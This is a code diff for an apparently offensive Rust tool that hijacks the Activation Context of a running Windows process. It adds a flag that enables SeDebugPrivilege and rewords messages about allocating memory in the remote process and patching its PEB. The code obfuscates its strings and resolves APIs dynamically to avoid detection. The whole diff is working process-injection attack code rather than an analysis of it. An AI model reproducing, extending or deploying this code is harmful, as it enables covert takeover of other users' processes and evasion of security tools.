@@ -91,6 +91,7 @@ fn main()
     opts.optopt("r", "resource-number", "Resource index of the current executable where the manifest is located.", "");
     opts.optopt("p", "pid", "PID of the process whose Activation Context is to be hijacked.", "");
     opts.optflag("n", "new-console", "Set CREATE_NEW_CONSOLE flag to spawn the new process.");
+    opts.optflag("d", "debug", "Enable SeDebugPrivilege to interact with the remote process.");
 
     let matches = match opts.parse(&args[1..]) 
     {
@@ -116,6 +117,7 @@ fn main()
     let mut manifest_path = String::new();
     let pid;
     let mut new_console = false;
+    let mut enable_debug = false;
 
     if matches.opt_present("r") {
         resource_index = matches.opt_str("r").unwrap().parse().unwrap();
@@ -139,14 +141,18 @@ fn main()
     } 
     else if mode == "hijack".to_string() 
     {
-        if matches.opt_present("i") {
-            pid = matches.opt_str("i").unwrap().parse().unwrap();
+        if matches.opt_present("p") {
+            pid = matches.opt_str("p").unwrap().parse().unwrap();
         } else {
             print_usage(&program, opts);
             return;
         }
 
-        hijack_process_or_thread(pid, resource_index, manifest_path);
+        if matches.opt_present("d") {
+            enable_debug = true;
+        }
+
+        hijack_process_or_thread(pid, resource_index, manifest_path, enable_debug);
     } 
     else {
         print_usage(&program, opts);
@@ -289,7 +295,7 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
             ptr::null_mut());
         
         if ret != 0 {
-            println!("{}", &lc!("[x] Failed to obtain new process' PEB base address."));
+            println!("{}", &lc!("[x] Failed to obtain the remote process' PEB base address."));
             return;
         }
 
@@ -309,11 +315,11 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
             PAGE_READWRITE);
         
         if ret != 0 {
-            println!("{}", &lc!("[x] Failed to allocate memory in the new process."));
+            println!("{}", &lc!("[x] Failed to allocate memory in the remote process."));
             return;
         }
 
-        println!("{}", &lc!("[+] Memory successfully allocated in the new process."));
+        println!("{}", &lc!("[+] Memory successfully allocated."));
 
         let written = usize::default();
         let bytes_written: *mut usize = std::mem::transmute(&written);
@@ -346,7 +352,7 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
         );
 
         if ret != 0 {
-            println!("{}", &lc!("[x] Failed to patch the new process PEB."));
+            println!("{}", &lc!("[x] Failed to patch the remote process PEB."));
             return;
         }
 
@@ -364,10 +370,26 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
     }
 }
 
-fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String) 
+fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String, enable_debug: bool) 
 {
     unsafe 
-    {
+    {   
+        if enable_debug 
+        {
+            let privilege: u32 = 20; // SeDebugPrivilege
+            let enable: u8 = 1; 
+            let current_thread: u8 = 0;
+            let enabled: *mut u8 = std::mem::transmute(&u8::default());            
+            let ret = dinvoke_rs::dinvoke::rtl_adjust_privilege(privilege,enable,current_thread,enabled);
+
+            if ret != 0 {
+                println!("{}",&lc!("[x] SeDebugPrivilege could not be enabled."));
+                return;
+            }
+
+            println!("{}",&lc!("[+] SeDebugPrivilege enabled."));
+        }
+        
         let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
         let mut embedded_manifest = true;
         let mut hmodule = 0isize;
@@ -549,7 +571,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         } 
 
         if (*teb_ptr).ActivationStack.ActiveFrame == ptr::null_mut() { // Main thread doesn't have a custom AC, meaning we can hijack the process' main AC
-            println!("\t\\{}", &lc!("[!] Main thread does not have a custom AC enabled. Hijacking process' main AC."));
+            println!("\t\\{}", &lc!("[!] Main thread does not have a custom AC enabled. Hijacking main AC of the process."));
             hijack_process(*process_handle_ptr, HANDLE::default(), dst, dwsize, false);
             return;
         }
@@ -567,7 +589,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
             return;
         }    
 
-        println!("{}", &lc!("[+] Memory successfully allocated in the remote process."));
+        println!("{}", &lc!("[+] Memory successfully allocated."));
         
         let total_offset = final_size - TOTAL_SIZE; 
 
